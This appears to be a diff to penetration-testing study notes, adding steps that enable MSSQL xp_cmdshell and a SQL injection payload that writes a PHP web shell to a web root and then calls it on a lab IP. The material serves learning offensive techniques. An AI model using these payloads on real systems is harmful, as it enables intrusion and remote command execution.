@@ -72,4 +72,24 @@ explore sysuers table inside master database
 
     $ select * from master.dbo.sysusers;
 
+<h4>xp_cmdshell</h4>
 
+after we connect to the db
+
+    $ EXECUTE sp_configure 'show advanced options', 1;
+    $ RECONFIGURE;
+    $ EXECUTE sp_configure 'xp_cmdshell', 1;
+    $ RECONFIGURE;
+    $ EXECUTE xp_cmdshell 'whoami';
+
+we can write files on the server with SELECT INTO_OUTFILE
+
+    $ ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+
+here we try to use a union select to write a php web shell to /htmp/tmp on the server
+
+now by entering the above statement into the form field we are injecting our webshell to the specified directory
+
+and then in the url - we can attempt to perform the http request to our webshell with the cmd=
+
+    http://192.168.50.50/tmp/webshell.php?cmd=id
